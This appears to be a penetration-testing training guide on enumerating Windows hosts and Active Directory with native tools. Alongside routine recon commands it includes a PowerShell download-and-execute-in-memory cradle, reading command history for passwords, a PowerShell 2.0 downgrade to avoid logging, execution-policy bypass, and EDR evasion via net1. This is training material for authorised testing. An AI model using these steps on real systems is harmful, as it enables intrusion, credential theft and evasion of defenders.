## Living Off the Land

When tool uploads are blocked or the client wants to understand what a low-footprint attacker can achieve, native Windows binaries and built-in commands become your primary enumeration method. Using tools that already exist on the host generates fewer alerts and blends in more naturally with normal administrative activity.

***

## Host and Environment Recon

### Basic Enumeration Commands

Run these from CMD or PowerShell to get a quick picture of the host's state, OS version, patch level, and domain membership:

| Command | Result |
|---------|--------|
| `hostname` | Prints the host name |
| `[System.Environment]::OSVersion.Version` | Prints OS version and revision level |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Lists applied patches and hotfixes |
| `ipconfig /all` | Prints network adapter state and configuration |
| `set` | Lists environment variables for the current session (CMD only) |
| `echo %USERDOMAIN%` | Displays the domain the host belongs to (CMD only) |
| `echo %logonserver%` | Prints the Domain Controller the host checks in with (CMD only) |

Running `systeminfo` covers most of the above in a single command, which generates fewer log entries than running each command individually.

***

## PowerShell Enumeration

### Key Cmdlets

| Cmdlet | Description |
|--------|-------------|
| `Get-Module` | Lists available modules loaded for use |
| `Get-ExecutionPolicy -List` | Prints the execution policy for each scope |
| `Set-ExecutionPolicy Bypass -Scope Process` | Bypasses execution policy for the current process only, reverts on exit |
| `Get-ChildItem Env: \| ft Key,Value` | Returns environment variables including key paths, usernames, and computer info |
| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` | Reads the current user's PowerShell command history, which may contain passwords or paths to credential files |
| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL'); <commands>"` | Downloads and executes a file from the web directly in memory |

### Quick Checks

```powershell
Get-Module
Get-ExecutionPolicy -List
whoami
Get-ChildItem Env: | ft key,value
```

***

## PowerShell Downgrade

PowerShell event logging was introduced in version 3.0. Downgrading to version 2.0 stops Script Block Logging from functioning, which means commands issued in that session will not be written to the PowerShell Operational log.

Check the current version, then downgrade:

```powershell
Get-Host
powershell.exe -version 2
Get-Host
```

Confirm the version reads `2.0` in the output. Be aware that the act of issuing `powershell.exe -version 2` is itself logged before the downgrade takes effect. A vigilant defender monitoring `Applications and Services Logs > Microsoft > Windows > PowerShell > Operational` will see logging stop after that point and may start an investigation. The entry in `Applications and Services Logs > Windows PowerShell` will show a new session started with `HostVersion 2.0`.

***

## Checking Defences

### Firewall State

```powershell
netsh advfirewall show allprofiles
```

This shows the state of the Domain, Private, and Public firewall profiles. A `State: OFF` entry across all profiles means the host has no active firewall filtering.

### Windows Defender State

Check whether the Defender service is running from CMD:

```cmd
sc query windefend
```

Check detailed Defender configuration from PowerShell, including signature age, real-time protection, and tamper protection:

```powershell
Get-MpComputerStatus
```

Key fields to check:

```
AMServiceEnabled         : True
AntivirusEnabled         : True
BehaviorMonitorEnabled   : True
IsTamperProtected        : True
RealTimeProtectionEnabled: True
```

***

## Checking for Other Logged-On Users

Before taking actions on a host, confirm whether any other users are currently logged in. An active user who notices unexpected behaviour may change their password or report the activity:

```powershell
qwinsta
```

Example output:

```
SESSIONNAME    USERNAME   ID  STATE
console        forend      1  Active
rdp-tcp               65536  Listen
```

***

## Network Enumeration

### Key Commands

| Command | Description |
|---------|-------------|
| `arp -a` | Lists all known hosts stored in the ARP table |
| `ipconfig /all` | Prints network adapter settings and segment information |
| `route print` | Displays the IPv4 and IPv6 routing table |
| `netsh advfirewall show allprofiles` | Shows firewall state across all profiles |

### ARP Table

```powershell
arp -a
```

Example output:

```
Interface: 172.16.5.25
  172.16.5.5     00-50-56-b9-08-26  dynamic
  172.16.5.130   00-50-56-b9-f0-e1  dynamic
  172.16.5.240   00-50-56-b9-9d-66  dynamic
```

### Routing Table

```powershell
route print
```

Any network appearing in the routing table is a potential lateral movement target. Routes are only added when traffic flows to those networks regularly, or when an administrator has set them manually.

***

## WMI Enumeration

[Windows Management Instrumentation (WMI)](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) is built into every Windows enterprise environment and can query detailed information about local and remote hosts without dropping any tools to disk.

| Command | Description |
|---------|-------------|
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Prints patch level and hotfix descriptions |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Displays basic host information |
| `wmic process list /format:list` | Lists all running processes |
| `wmic ntdomain list /format:list` | Displays domain and Domain Controller information |
| `wmic useraccount list /format:list` | Lists local accounts and any domain accounts that have logged into the device |
| `wmic group list /format:list` | Lists all local groups |
| `wmic sysaccount list /format:list` | Dumps information about system accounts used as service accounts |

Query domain and forest information including trust relationships:

```powershell
wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
```

Example output:

```
Caption          DnsForestName           DomainControllerAddress  DomainName
INLANEFREIGHT    INLANEFREIGHT.LOCAL     \\172.16.5.5             INLANEFREIGHT
LOGISTICS        INLANEFREIGHT.LOCAL     \\172.16.5.240           LOGISTICS
FREIGHTLOGISTIC  FREIGHTLOGISTICS.LOCAL  \\172.16.5.238           FREIGHTLOGISTIC
```

***

## Net Commands

`net.exe` commands are heavily monitored by most EDR solutions. Use with caution on evasive assessments. If you suspect active monitoring, substituting `net1` for `net` executes the same functions without triggering on the `net` string.

| Command | Description |
|---------|-------------|
| `net accounts` | Password requirements on local host |
| `net accounts /domain` | Domain password and lockout policy |
| `net group /domain` | All domain groups |
| `net group "Domain Admins" /domain` | Members with Domain Admin privileges |
| `net group "Domain Controllers" /domain` | Domain Controller computer accounts |
| `net group "domain computers" /domain` | All computers joined to the domain |
| `net user /domain` | All domain users |
| `net user <username> /domain` | Detailed information on a specific domain user |
| `net user %username%` | Information about the current user |
| `net localgroup administrators /domain` | Members of the local Administrators group |
| `net share` | Currently active shares |
| `net view /domain` | List of computers in the domain |
| `net view \\\computer /ALL` | All shares on a specific computer |

Example output from `net user /domain wrouse`:

```
User name              wrouse
Full Name              Christopher Davis
Account active         Yes
Password last set      10/27/2021 10:38:01 AM
Password expires       Never
Global Group memberships: File Share G Drive, File Share H Drive, Warehouse, Domain Users, VPN Users
```

***

## Dsquery

[dsquery](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952(v=ws.11)) is a built-in command-line tool installed on any host with the Active Directory Domain Services role. The `dsquery.dll` file exists on all modern Windows systems by default at `C:\Windows\System32\dsquery.dll`. It requires elevated privileges or a SYSTEM context.

### User Search

```powershell
dsquery user
```

### Computer Search

```powershell
dsquery computer
```

### Wildcard Search on an OU

```powershell
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```

### Find Accounts with PASSWD_NOTREQD Flag Set

Accounts with this UAC flag do not require a password to authenticate, making them easy targets:

```powershell
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
```

Example output:

```
CN=Guest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL               66082
CN=Marion Lowe,OU=HelpDesk,...,DC=INLANEFREIGHT,DC=LOCAL   66080
CN=NAGIOSAGENT,OU=Service Accounts,...,DC=LOCAL            544
```

### Find Domain Controllers

```powershell
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```

***

## LDAP Filtering with dsquery

LDAP filters use OID matching rules to evaluate UAC bit values. The three main rules are:

| OID | Behaviour |
|-----|-----------|
| `1.2.840.113556.1.4.803` | Bit value must match exactly, good for matching a single attribute |
| `1.2.840.113556.1.4.804` | Returns results where any bit in the chain matches, useful for objects with multiple attributes set |
| `1.2.840.113556.1.4.1941` | Matches against Distinguished Names and searches through all ownership and membership entries |

### Logical Operators

Combine multiple conditions using `&` (AND), `|` (OR), and `!` (NOT):

```
# Users where password cannot be changed
(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))

# Users where password CAN be changed (negation)
(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))

# Chaining multiple conditions
(&(condition1)(condition2)(condition3))
```

These same LDAP filter strings work across multiple tools including the ActiveDirectory PowerShell module, [ldapsearch](https://linux.die.net/man/1/ldapsearch), and [windapsearch](https://github.com/ropnop/windapsearch), not just dsquery.
